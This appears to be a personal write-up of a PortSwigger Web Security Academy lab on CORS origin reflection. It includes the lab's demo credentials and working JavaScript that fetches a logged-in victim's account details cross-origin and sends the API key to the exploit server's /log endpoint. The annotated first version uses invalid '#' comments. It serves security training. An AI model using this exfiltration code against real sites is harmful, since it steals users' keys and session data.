
# CORS vulnerability with basic origin reflection

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 
- https://portswigger.net/web-security/cors
- https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/

---------------------------------------------

Generated link: https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net/

We have the endpoint "/accountDetails":



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/1.png)


Original code:

```
<html>
  <body>
    <script>

    #Initialize the XMLHttpRequest object, and the application URL vairable 
        var req = new XMLHttpRequest();
        var url = ("APPLICATION URL");

    #MLHttpRequest object loads, exectutes reqListener() function
      req.onload = retrieveKeys;

    #Make GET request to the application accounDetails location
        req.open('GET', url + "/accountDetails",true);
    
    #Allow passing credentials with the requests
    req.withCredentials = true;

    #Send the request 
        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```

Updated code:


```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net");
      req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
    
    req.withCredentials = true;

        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/2.png)

Decode:



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/3.png)